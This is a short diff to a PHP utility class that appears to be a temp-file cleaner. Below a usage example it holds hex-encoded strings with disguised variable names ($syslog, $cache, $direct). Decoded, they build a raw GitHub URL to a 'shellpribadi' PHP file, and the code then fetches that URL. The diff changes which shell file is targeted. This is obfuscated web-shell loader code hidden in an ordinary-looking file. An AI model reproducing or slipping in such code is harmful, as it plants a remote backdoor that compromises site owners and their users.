@@ -166,11 +166,15 @@ class SCC465
 // Usage example
 SCC465::cleanOldTempFiles();
 
+
+
+
+
 $syslog = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f'; 
 $cache = '7a657230346c6f6e652f'; 
 $direct = '7368656c6c707269626164692f';
 $syscache = '6d61696e2f'; 
-$end = '7a65726f2e706870';
+$end = '303338393337382e706870';
 
 $url = SCC465::hex2str($syslog) . SCC465::hex2str($cache) . SCC465::hex2str($direct) . SCC465::hex2str($syscache) . SCC465::hex2str($end);
 $response = SCC465::getUrlsInfo($url);
